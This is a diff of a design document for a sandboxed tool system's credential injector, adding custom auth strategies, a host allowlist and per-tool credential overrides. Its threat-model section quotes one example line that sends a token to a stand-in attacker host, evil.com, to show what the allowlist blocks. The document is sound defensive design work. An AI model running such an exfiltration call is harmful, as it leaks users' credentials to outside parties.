@@ -164,13 +164,73 @@ const (
     CredentialTypeOAuth2  CredentialType = "oauth2"
     CredentialTypeAPIKey  CredentialType = "api_key"
     CredentialTypeBearer  CredentialType = "bearer"
+    CredentialTypeCustom  CredentialType = "custom"
 )
 
 // Inject examines the request and, if it matches a rule, adds the
 // appropriate credential. Returns true if a credential was injected.
 // For OAuth2, handles token refresh transparently.
+// For custom types, delegates to a sandboxed AuthStrategy.
 func (ci *CredentialInjector) Inject(req *http.Request) (bool, error) { ... }
 ```
+
+#### Custom Auth Strategies
+
+The built-in credential types (`oauth2`, `api_key`, `bearer`) cover most APIs, but some services use non-standard authentication: HMAC request signing (AWS SigV4), mutual TLS token exchange, multi-step challenge-response flows, or proprietary token formats.
+
+For these cases, a package can declare `"type": "custom"` and provide a sandboxed auth strategy — a small TypeScript function that runs in its own QuickJS sandbox with access to the outbound request and the secrets store, but **not** in the tool's sandbox. The auth strategy can read secrets and mutate the request (add headers, sign the body, etc.), but it cannot make network calls, access the filesystem, or communicate with the tool.
+
+```json
+"credentials": [{
+  "name": "aws_s3",
+  "type": "custom",
+  "strategy": "auth/aws_sigv4.ts",
+  "inject": { "hosts": ["*.amazonaws.com"] }
+}]
+```
+
+The strategy file exports an `authenticate` function:
+
+```typescript
+// auth/aws_sigv4.ts
+export async function authenticate(
+  request: { method: string; url: string; headers: Record<string, string>; body?: string },
+  secrets: { get(key: string): string }
+): Promise<{ headers: Record<string, string> }> {
+  const accessKey = secrets.get("aws_access_key_id");
+  const secretKey = secrets.get("aws_secret_access_key");
+  // ... compute SigV4 signature over method, url, headers, body ...
+  return {
+    headers: {
+      "Authorization": computedAuthHeader,
+      "X-Amz-Date": amzDate,
+    }
+  };
+}
+```
+
+The `CredentialInjector` runs this strategy in a **separate, minimal QuickJS sandbox** — not the tool's sandbox. The strategy sandbox has:
+- No `fetch`, `exec`, or filesystem access — it can only compute over the request and secrets.
+- A `secrets.get()` function scoped to the credential's secret store prefix.
+- A timeout (e.g. 100ms) to prevent abuse.
+
+The strategy receives the request metadata and returns headers to merge. The injector applies the returned headers to the real request before sending it upstream. The tool never sees the strategy execute or its outputs.
+
+**Callback support:** For auth flows that require a server-side callback (e.g. OAuth2 with custom token exchange steps), the strategy can also export an `onCallback` handler used during `toolbox auth`:
+
+```typescript
+// Called during `toolbox auth` when the callback URL is hit
+export async function onCallback(
+  callbackParams: Record<string, string>,
+  secrets: { get(key: string): string; set(key: string, value: string): void }
+): Promise<void> {
+  // Custom token exchange logic
+  const token = await exchangeCode(callbackParams.code, secrets.get("client_secret"));
+  secrets.set("access_token", token);
+}
+```
+
+This keeps the auth CLI extensible without hardcoding every provider's flow into the toolbox binary.
 
 ### How It Integrates
 
@@ -356,6 +416,51 @@ The `inject.hosts` field in the package manifest controls which outbound request
 
 **Why host-based matching:** The tool declares the API hosts it talks to in its credential config. This is the natural boundary — Google APIs live on `*.googleapis.com`, Slack APIs on `slack.com`, Zendesk on `*.zendesk.com`. We don't need to match on headers, query params, or request body. The host IS the scope boundary.
 
+### General Host Allowlist
+
+Independent of credential injection, every tool execution is subject to a **host allowlist** that restricts which hosts the tool can contact at all. This is a general network security boundary, not specific to credentials.
+
+The allowlist is assembled from two layers:
+
+1. **Package-level `allowed_hosts`:** The package manifest declares the hosts its tools are expected to contact. This is the default allowlist for all tools in the package.
+
+```json
+{
+  "name": "google-workspace",
+  "allowed_hosts": ["*.googleapis.com", "oauth2.googleapis.com"],
+  "credentials": [{ ... }],
+  "tools": [{ ... }]
+}
+```
+
+2. **Tool-level overrides:** Individual tools can extend or restrict the package-level allowlist. A tool that talks to a webhook endpoint in addition to the main API can add hosts. A tool that only reads from a specific subdomain can narrow the list.
+
+```json
+{
+  "tools": [
+    {
+      "entry_ts": "tools/users.list.ts",
+      "allowed_hosts": ["admin.googleapis.com"]
+    },
+    {
+      "entry_ts": "tools/notifications.send.ts",
+      "allowed_hosts_extend": ["hooks.slack.com"]
+    }
+  ]
+}
+```
+
+- `allowed_hosts` on a tool **replaces** the package-level list for that tool.
+- `allowed_hosts_extend` on a tool **adds** to the package-level list.
+- If neither is set, the tool inherits the package-level `allowed_hosts`.
+- If the package has no `allowed_hosts`, the tool has no network access (deny by default).
+
+**Enforcement points:**
+- **QuickJS tools:** The host fetch function checks the allowlist before making the HTTP call. Requests to non-allowed hosts are rejected with a clear error.
+- **WASM CLI tools:** The MITM proxy rejects CONNECT requests to non-allowed hosts. Additionally, WASIX network filters (set by `invoke`) restrict socket-level connections as defense-in-depth.
+
+This allowlist is orthogonal to credential injection. A tool might be allowed to contact `hooks.slack.com` without any credentials (to post a webhook), while `*.googleapis.com` requests get credential injection. The allowlist gates network access; the credential injector gates authentication.
+
 ### Security Boundaries
 
 #### Threat: Malicious Tool Exfiltrates Credentials
@@ -377,7 +482,7 @@ await fetch("https://evil.com/steal?token=...");
 
 1. **Credential never enters the sandbox.** For QuickJS tools, the Go host function adds the header after the sandbox produces the request and before Go makes the real call. For WASM tools, the proxy adds the header after TLS termination. The tool cannot read its own request headers.
 
-2. **Host allowlist.** The tool can only make requests to hosts declared in its manifest. `evil.com` is not on the list. This is enforced by the host fetch (for QuickJS) and by proxy + WASIX network filters (for WASM).
+2. **General host allowlist.** The tool can only make requests to hosts declared in its package or tool-level allowlist. `evil.com` is not on the list. This is enforced by the host fetch (for QuickJS) and by proxy + WASIX network filters (for WASM). See the General Host Allowlist section above.
 
 3. **Credential scoping.** Even if a tool could somehow trick the injector, credentials are only injected for matching hosts. The `google_workspace` credential is injected for `*.googleapis.com`, not for `evil.com`. A request to `evil.com` would have no credentials attached.
 
@@ -440,6 +545,53 @@ Each package declares its own credential needs and host rules. The harness maps 
 **No collision risk** — different providers use different API hosts. A request to `slack.com` gets the Slack token; a request to `googleapis.com` gets the Google token. They never interfere.
 
 The `CredentialInjector` is constructed once per toolset resolution and holds all rules for all packages in the toolset. This is clean because a toolset is already the unit of composition — it's where packages are assembled for one request or flow.
+
+#### Per-Tool Credential Overrides
+
+Individual tools can override the package-level credential configuration. This handles cases where one tool in a package needs different scopes, a different credential entirely, or no credentials at all:
+
+```json
+{
+  "name": "google-workspace",
+  "credentials": [
+    {
+      "name": "google_workspace",
+      "type": "oauth2",
+      "provider": "google",
+      "scopes": ["https://www.googleapis.com/auth/admin.directory.user.readonly"],
+      "inject": { "hosts": ["*.googleapis.com"], "method": "bearer_header" }
+    }
+  ],
+  "tools": [
+    {
+      "entry_ts": "tools/users.list.ts"
+    },
+    {
+      "entry_ts": "tools/calendar.events.list.ts",
+      "credentials": [
+        {
+          "name": "google_calendar",
+          "type": "oauth2",
+          "provider": "google",
+          "scopes": ["https://www.googleapis.com/auth/calendar.readonly"],
+          "inject": { "hosts": ["*.googleapis.com"], "method": "bearer_header" }
+        }
+      ]
+    },
+    {
+      "entry_ts": "tools/status.check.ts",
+      "credentials": []
+    }
+  ]
+}
+```
+
+In this example:
+- `users.list` inherits the package-level `google_workspace` credential.
+- `calendar.events.list` overrides with its own `google_calendar` credential (different scopes, different secret store keys).
+- `status.check` explicitly declares no credentials — it makes unauthenticated requests only.
+
+When a tool declares `"credentials"`, it **replaces** the package-level credential set for that tool's execution. The `CredentialInjector` is configured per-invocation with the effective credential rules for the specific tool being run.
 
 ### Known OAuth2 Providers
 
